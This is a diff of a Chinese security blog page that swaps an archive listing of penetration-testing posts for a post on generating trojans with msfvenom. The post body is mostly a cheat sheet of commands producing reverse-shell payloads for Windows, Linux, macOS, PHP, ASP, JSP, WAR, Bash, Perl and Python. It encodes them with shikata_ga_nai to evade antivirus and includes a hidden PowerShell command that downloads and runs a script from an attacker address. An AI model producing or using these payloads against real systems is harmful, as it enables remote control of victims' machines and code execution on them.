@@ -5,7 +5,7 @@
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   
-  <title>Archives: 2019 | 一日看尽长安花</title>
+  <title>msfvenom生成木马 | 一日看尽长安花</title>
   
   
   <meta name="description" content="一生忠于热爱">
@@ -51,7 +51,7 @@
   
   
   <div class="cover-wrapper">
-    <cover class='cover  half'>
+    <cover class='cover post half'>
       
         
   <h1 class='title'>山河</h1>
@@ -200,38 +200,10 @@
   <div class="l_body">
     <div class='body-wrapper'>
       <div class='l_main'>
-	
-		
-  <section class="post-list">
-    
-      
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-      
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <article class="post reveal ">
   
+
+  <article id="post" class="post white-box article-type-post" itemscope itemprop="blogPost">
+    
 
 
   <section class='meta'>
@@ -240,11 +212,13 @@
     <div class="meta" id="header-meta">
       
         
-  <h2 class="title">
-    <a href="/2019/12/07/%C2%96msfvenom%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC/">
-      msfvenom生成木马
-    </a>
-  </h2>
+  
+    <h1 class="title">
+      <a href="/2019/12/07/%C2%96msfvenom%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC/">
+        msfvenom生成木马
+      </a>
+    </h1>
+  
 
 
       
@@ -285,6 +259,24 @@
         
           
             
+  
+    <div class="new-meta-item browse busuanzi">
+      <a class='notlink'>
+        <i class="fas fa-eye" aria-hidden="true"></i>
+        <p>
+          <span id="busuanzi_value_page_pv">
+            <i class="fas fa-spinner fa-spin fa-fw" aria-hidden="true"></i>
+          </span>
+        </p>
+      </a>
+    </div>
+  
+
+
+          
+        
+          
+            
 
           
         
@@ -296,787 +288,140 @@
   </section>
 
 
-  <section class="article typo">
-    <div class="article-entry" itemprop="articleBody">
-      
-      
-        <div class="readmore">
-          <a href="/2019/12/07/%C2%96msfvenom%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC/" class="flat-box">
-            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
-    
-      <div class="full-width auto-padding tags">
-        
-          <a href="/tags/%E5%B7%A5%E5%85%B7/" rel="nofollow"><i class="fas fa-tag fa-fw"></i> 工具</a>
-        
+    <section class="article typo">
+      <div class="article-entry" itemprop="articleBody">
+        <hr>
+<p>msfvenom生成shellcode：</p>
+<p>简单生成：</p>
+<p>​        msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.157.133 LPORT=11111 -f exe -o /root/1.exe</p>
+<p><img src="https://img.vim-cn.com/c5/d9c67375dd4c1ec02137b88be039e3235d8593.png" alt="1"></p>
+<p>-p 指定payload，payload后跟该payload的选项</p>
+<p>-o 指定payload的保存路径，包含文件名</p>
+<p>替换指定代码：</p>
+<p>​        msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.157.132 LPORT=11111 -b ‘\x00’ -f exe -o /root/1.exe</p>
+<p><img src="https://img.vim-cn.com/e5/44e7181d3af7fe217e5e67a47a30a15673eb05.png" alt="2"></p>
+<p>-b 替换代码中会出现中断的字符，如 ‘\x00\xff’</p>
+<p>指定编码器：</p>
+<p>​        msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.157.132 LPORT=11111 -b ‘\x00’ -e x86/shikata_ga_nai -f exe -o /root/1.exe</p>
+<p><img src="https://img.vim-cn.com/21/1b62b1f8e53ab179dbd4da1cc31ebdd4651b65.png" alt="3"></p>
+<p>-e 指定特定的编码器</p>
+<p>Windows：</p>
+<p>​        msfvenom –platform windows –a x86 –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –f exe –o C:\back.exe<br>​        msfvenom –platform windows –a x86 –p windows/x64/meterpreter/reverse_tcp –f exe –o C:\back.exe</p>
+<p>Linux：<br>        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf &gt; shell.elf</p>
+<p>MAC：<br>        msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho &gt; shell.macho</p>
+<p>PHP：<br>        msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.php</p>
+<p>Asp：<br>        msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp &gt; shell.asp</p>
+<p>Aspx：<br>        msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f aspx &gt; shell.aspx</p>
+<p>JSP：<br>        msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.jsp</p>
+<p>War：<br>        msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war &gt; shell.war</p>
+<p>Bash：<br>        msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On>-f raw &gt; shell.sh</p>
+<p>Perl：<br>        msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.pl</p>
+<p>Python：<br>        msfvenom -p python/meterpreter/reverser_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.py</p>
+<p>exe 利用exec执行powershell后门:<br>        msfvenom -p windows/exec CMD=”powershell.exe -nop -w hidden -c $M=new-object net.webclient;$M.proxy=[Net.WebRequest]::GetSystemWebProxy();$M.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $M.downloadstring(‘<a href="http://192.168.157.132:8080/4WFjDXrGo7Mj&#39;);&quot;" target="_blank" rel="noopener">http://192.168.157.132:8080/4WFjDXrGo7Mj&#39;);&quot;</a> -f exe -e x86/shikata_ga_nai -i 6 -o msf.exe</p>
+<p>列出所有可用的攻击载荷：</p>
+<p><img src="https://img.vim-cn.com/c2/49f2ba4a8a0f6e4acfc59020d5afc09a4487be.png" alt="11"></p>
+<p>列出Windows平台下最为常见的payload个数：</p>
+<p><img src="https://img.vim-cn.com/0e/2fb66bcd14658adcccac4655538c0855ccc2e8.png" alt="12"></p>
+<p>查看excellent级的编码方式：</p>
+<p><img src="https://img.vim-cn.com/44/ae0116860d8ecfc3da9437fd12277446ef9bc9.png" alt="13"></p>
+<p>查看nops（空字段）选项：</p>
+<p><img src="https://img.vim-cn.com/18/2597fd7c59b384d8434645424863747519faae.png" alt="14"></p>
+<p>查看可以生产的格式：</p>
+<p><img src="https://img.vim-cn.com/eb/bd7b4f8c70a6e7ec356bc4b9314046884282bf.png" alt="15"></p>
+<p>查看当前支持的平台：</p>
+<p><img src="https://img.vim-cn.com/13/ac42cb17ab0e5944e070b68a6469ea1e6223d1.png" alt="16"></p>
+
       </div>
-    
-  </section>
-</article>
-
-          </div>
+      
+      
+        <br>
         
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
       
         
-          <div class='post-wrapper'>
-            <article class="post reveal ">
-  
-
-
-  <section class='meta'>
-    
-    
-    <div class="meta" id="header-meta">
-      
-        
-  <h2 class="title">
-    <a href="/2019/12/07/weevely/">
-      weevely
-    </a>
-  </h2>
-
-
-      
-      <div class='new-meta-box'>
-        
-          
-        
-          
-            
-  <div class='new-meta-item author'>
-    
-      <a href="/http:/yoursite.com" rel="nofollow">
-        
-          <i class="fas fa-user" aria-hidden="true"></i>
-        
-        <p>南北_</p>
-      </a>
-    
-  </div>
-
-
-          
-        
-          
-            <div class="new-meta-item date">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2019-12-07T19:44:48+08:00">
   <a class='notlink'>
-    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-    <p>2019-12-07</p>
+    <i class="fas fa-clock" aria-hidden="true"></i>
+    <p>更新于 2019年12月7日</p>
   </a>
 </div>
 
-          
         
-          
-            
-
-          
-        
-          
-            
-
-          
-        
-      </div>
       
-        <hr>
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E5%B7%A5%E5%85%B7/" rel="nofollow"><i class="fas fa-tag" aria-hidden="true"></i><p>工具</p></a></div>
+
+
+        
+      
+        
+          
+
+        
       
     </div>
   </section>
 
 
-  <section class="article typo">
-    <div class="article-entry" itemprop="articleBody">
       
       
-        <div class="readmore">
-          <a href="/2019/12/07/weevely/" class="flat-box">
-            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
-    
-      <div class="full-width auto-padding tags">
-        
-          <a href="/tags/%E5%B7%A5%E5%85%B7/" rel="nofollow"><i class="fas fa-tag fa-fw"></i> 工具</a>
-        
-      </div>
-    
-  </section>
-</article>
-
+          <div class="prev-next">
+              
+              
+                  <section class="next">
+                      <span class="art-item-right" aria-hidden="true">
+                          <h6>下一页&nbsp;<i class="fas fa-chevron-right" aria-hidden="true"></i></h6>
+                          <h4>
+                              <a href="/2019/12/07/weevely/" rel="prev" title="weevely">
+                                  
+                                      weevely
+                                  
+                              </a>
+                          </h4>
+                          
+                              
+                              <h6 class="tags">
+                                  <a class="tag" href="/tags/%E5%B7%A5%E5%85%B7/"><i class="fas fa-tag fa-fw" aria-hidden="true"></i> 工具</a>
+                              </h6>
+                          
+                      </span>
+                  </section>
+              
           </div>
-        
       
-        
-          <div class='post-wrapper'>
-            <article class="post reveal ">
-  
+    </section>
+  </article>
 
 
-  <section class='meta'>
-    
-    
-    <div class="meta" id="header-meta">
-      
-        
-  <h2 class="title">
-    <a href="/2019/12/07/nikto/">
-      nikto
-    </a>
-  </h2>
 
+  <!-- 显示推荐文章和评论 -->
 
-      
-      <div class='new-meta-box'>
-        
-          
-        
-          
-            
-  <div class='new-meta-item author'>
-    
-      <a href="/http:/yoursite.com" rel="nofollow">
-        
-          <i class="fas fa-user" aria-hidden="true"></i>
-        
-        <p>南北_</p>
-      </a>
-    
-  </div>
 
-
-          
-        
-          
-            <div class="new-meta-item date">
-  <a class='notlink'>
-    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-    <p>2019-12-07</p>
-  </a>
-</div>
-
-          
-        
-          
-            
-
-          
-        
-          
-            
-
-          
-        
-      </div>
-      
-        <hr>
-      
-    </div>
-  </section>
-
-
-  <section class="article typo">
-    <div class="article-entry" itemprop="articleBody">
-      
-      
-        <div class="readmore">
-          <a href="/2019/12/07/nikto/" class="flat-box">
-            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
-    
-      <div class="full-width auto-padding tags">
-        
-          <a href="/tags/%E5%B7%A5%E5%85%B7/" rel="nofollow"><i class="fas fa-tag fa-fw"></i> 工具</a>
-        
-      </div>
-    
-  </section>
-</article>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <article class="post reveal ">
-  
-
-
-  <section class='meta'>
-    
-    
-    <div class="meta" id="header-meta">
-      
-        
-  <h2 class="title">
-    <a href="/2019/12/07/w3af%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%A8%A1%E5%BC%8F/">
-      w3af命令行模式
-    </a>
-  </h2>
-
-
-      
-      <div class='new-meta-box'>
-        
-          
-        
-          
-            
-  <div class='new-meta-item author'>
-    
-      <a href="/http:/yoursite.com" rel="nofollow">
-        
-          <i class="fas fa-user" aria-hidden="true"></i>
-        
-        <p>南北_</p>
-      </a>
-    
-  </div>
-
-
-          
-        
-          
-            <div class="new-meta-item date">
-  <a class='notlink'>
-    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-    <p>2019-12-07</p>
-  </a>
-</div>
-
-          
-        
-          
-            
-
-          
-        
-          
-            
-
-          
-        
-      </div>
-      
-        <hr>
-      
-    </div>
-  </section>
-
-
-  <section class="article typo">
-    <div class="article-entry" itemprop="articleBody">
-      
-      
-        <div class="readmore">
-          <a href="/2019/12/07/w3af%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%A8%A1%E5%BC%8F/" class="flat-box">
-            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
-    
-      <div class="full-width auto-padding tags">
-        
-          <a href="/tags/%E5%B7%A5%E5%85%B7/" rel="nofollow"><i class="fas fa-tag fa-fw"></i> 工具</a>
-        
-      </div>
-    
-  </section>
-</article>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <article class="post reveal ">
-  
-
-
-  <section class='meta'>
-    
-    
-    <div class="meta" id="header-meta">
-      
-        
-  <h2 class="title">
-    <a href="/2019/12/07/Linux%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F/">
-      Linux笑脸漏洞渗透
-    </a>
-  </h2>
-
-
-      
-      <div class='new-meta-box'>
-        
-          
-        
-          
-            
-  <div class='new-meta-item author'>
-    
-      <a href="/http:/yoursite.com" rel="nofollow">
-        
-          <i class="fas fa-user" aria-hidden="true"></i>
-        
-        <p>南北_</p>
-      </a>
-    
-  </div>
-
-
-          
-        
-          
-            <div class="new-meta-item date">
-  <a class='notlink'>
-    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-    <p>2019-12-07</p>
-  </a>
-</div>
-
-          
-        
-          
-            
-
-          
-        
-          
-            
-
-          
-        
-      </div>
-      
-        <hr>
-      
-    </div>
-  </section>
-
-
-  <section class="article typo">
-    <div class="article-entry" itemprop="articleBody">
-      
-      
-        <div class="readmore">
-          <a href="/2019/12/07/Linux%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F/" class="flat-box">
-            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
-    
-      <div class="full-width auto-padding tags">
-        
-          <a href="/tags/%E6%B8%97%E9%80%8F/" rel="nofollow"><i class="fas fa-tag fa-fw"></i> 渗透</a>
-        
-      </div>
-    
-  </section>
-</article>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <article class="post reveal ">
-  
-
-
-  <section class='meta'>
-    
-    
-    <div class="meta" id="header-meta">
-      
-        
-  <h2 class="title">
-    <a href="/2019/12/07/Linux%E9%80%9A%E8%BF%87smb%E6%9C%8D%E5%8A%A1%E6%B8%97%E9%80%8F/">
-      Linux通过smb服务渗透
-    </a>
-  </h2>
-
-
-      
-      <div class='new-meta-box'>
-        
-          
-        
-          
-            
-  <div class='new-meta-item author'>
-    
-      <a href="/http:/yoursite.com" rel="nofollow">
-        
-          <i class="fas fa-user" aria-hidden="true"></i>
-        
-        <p>南北_</p>
-      </a>
-    
-  </div>
-
-
-          
-        
-          
-            <div class="new-meta-item date">
-  <a class='notlink'>
-    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-    <p>2019-12-07</p>
-  </a>
-</div>
-
-          
-        
-          
-            
-
-          
-        
-          
-            
-
-          
-        
-      </div>
-      
-        <hr>
-      
-    </div>
-  </section>
-
-
-  <section class="article typo">
-    <div class="article-entry" itemprop="articleBody">
-      
-      
-        <div class="readmore">
-          <a href="/2019/12/07/Linux%E9%80%9A%E8%BF%87smb%E6%9C%8D%E5%8A%A1%E6%B8%97%E9%80%8F/" class="flat-box">
-            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
-    
-      <div class="full-width auto-padding tags">
-        
-          <a href="/tags/%E6%B8%97%E9%80%8F/" rel="nofollow"><i class="fas fa-tag fa-fw"></i> 渗透</a>
-        
-      </div>
-    
-  </section>
-</article>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <article class="post reveal ">
-  
-
-
-  <section class='meta'>
-    
-    
-    <div class="meta" id="header-meta">
-      
-        
-  <h2 class="title">
-    <a href="/2019/12/06/%E5%8F%8C%E8%84%89%E5%86%B2%E6%98%9F%E6%B8%97%E9%80%8F/">
-      双脉冲星渗透
-    </a>
-  </h2>
-
-
-      
-      <div class='new-meta-box'>
-        
-          
-        
-          
-            
-  <div class='new-meta-item author'>
-    
-      <a href="/http:/yoursite.com" rel="nofollow">
-        
-          <i class="fas fa-user" aria-hidden="true"></i>
-        
-        <p>南北_</p>
-      </a>
-    
-  </div>
-
-
-          
-        
-          
-            <div class="new-meta-item date">
-  <a class='notlink'>
-    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-    <p>2019-12-06</p>
-  </a>
-</div>
-
-          
-        
-          
-            
-
-          
-        
-          
-            
-
-          
-        
-      </div>
-      
-        <hr>
-      
-    </div>
-  </section>
-
-
-  <section class="article typo">
-    <div class="article-entry" itemprop="articleBody">
-      
-      
-        <div class="readmore">
-          <a href="/2019/12/06/%E5%8F%8C%E8%84%89%E5%86%B2%E6%98%9F%E6%B8%97%E9%80%8F/" class="flat-box">
-            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
-    
-      <div class="full-width auto-padding tags">
-        
-          <a href="/tags/%E6%B8%97%E9%80%8F/" rel="nofollow"><i class="fas fa-tag fa-fw"></i> 渗透</a>
-        
-      </div>
-    
-  </section>
-</article>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <article class="post reveal ">
-  
-
-
-  <section class='meta'>
-    
-    
-    <div class="meta" id="header-meta">
-      
-        
-  <h2 class="title">
-    <a href="/2019/12/06/MS08-067%E6%B8%97%E9%80%8F/">
-      MS08_067渗透
-    </a>
-  </h2>
-
-
-      
-      <div class='new-meta-box'>
-        
-          
-        
-          
-            
-  <div class='new-meta-item author'>
-    
-      <a href="/http:/yoursite.com" rel="nofollow">
-        
-          <i class="fas fa-user" aria-hidden="true"></i>
-        
-        <p>南北_</p>
-      </a>
-    
-  </div>
-
-
-          
-        
-          
-            <div class="new-meta-item date">
-  <a class='notlink'>
-    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-    <p>2019-12-06</p>
-  </a>
-</div>
-
-          
-        
-          
-            
-
-          
-        
-          
-            
-
-          
-        
-      </div>
-      
-        <hr>
-      
-    </div>
-  </section>
-
-
-  <section class="article typo">
-    <div class="article-entry" itemprop="articleBody">
-      
-      
-        <div class="readmore">
-          <a href="/2019/12/06/MS08-067%E6%B8%97%E9%80%8F/" class="flat-box">
-            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
-    
-      <div class="full-width auto-padding tags">
-        
-          <a href="/tags/%E6%B8%97%E9%80%8F/" rel="nofollow"><i class="fas fa-tag fa-fw"></i> 渗透</a>
-        
-      </div>
-    
-  </section>
-</article>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <article class="post reveal ">
-  
-
-
-  <section class='meta'>
-    
-    
-    <div class="meta" id="header-meta">
-      
-        
-  <h2 class="title">
-    <a href="/2019/12/06/MS17_010%E6%B8%97%E9%80%8F/">
-      MS17_010渗透
-    </a>
-  </h2>
-
-
-      
-      <div class='new-meta-box'>
-        
-          
-        
-          
-            
-  <div class='new-meta-item author'>
-    
-      <a href="/http:/yoursite.com" rel="nofollow">
-        
-          <i class="fas fa-user" aria-hidden="true"></i>
-        
-        <p>南北_</p>
-      </a>
-    
-  </div>
-
-
-          
-        
-          
-            <div class="new-meta-item date">
-  <a class='notlink'>
-    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-    <p>2019-12-06</p>
-  </a>
-</div>
-
-          
-        
-          
-            
-
-          
-        
-          
-            
-
-          
-        
-      </div>
-      
-        <hr>
-      
-    </div>
-  </section>
-
-
-  <section class="article typo">
-    <div class="article-entry" itemprop="articleBody">
-      
-      
-        <div class="readmore">
-          <a href="/2019/12/06/MS17_010%E6%B8%97%E9%80%8F/" class="flat-box">
-            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
-    
-      <div class="full-width auto-padding tags">
-        
-          <a href="/tags/%E6%B8%97%E9%80%8F/" rel="nofollow"><i class="fas fa-tag fa-fw"></i> 渗透</a>
-        
-      </div>
-    
-  </section>
-</article>
-
-          </div>
-        
-      
-    
-  </section>
-  
-    
-    <!-- 根据主题中的设置决定是否在archive中针对摘要部分的MathJax公式加载mathjax.js文件 -->
-    
-    
 
   
 
 
-	
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+
+  <script>
+    window.subData = {
+      title: 'msfvenom生成木马',
+      tools: true
+    }
+  </script>
+
+
 </div>
 <aside class='l_side'>
   
@@ -1251,6 +596,34 @@
           
         
       
+        
+          
+          
+        
+          
+          
+        
+          
+          
+        
+          
+          
+        
+      
+        
+          
+          
+        
+          
+          
+        
+          
+          
+        
+          
+          
+        
+      
     
 
   
@@ -1322,14 +695,6 @@
     } 
 setInterval("createtime()",250);
 </script>
-
-
-
-
-	<!-- 根据主题中的设置决定是否在archive中针对摘要部分的MathJax公式加载mathjax.js文件 -->
-	
-
-	
 
 
       <script>setLoadingBarProgress(60);</script>
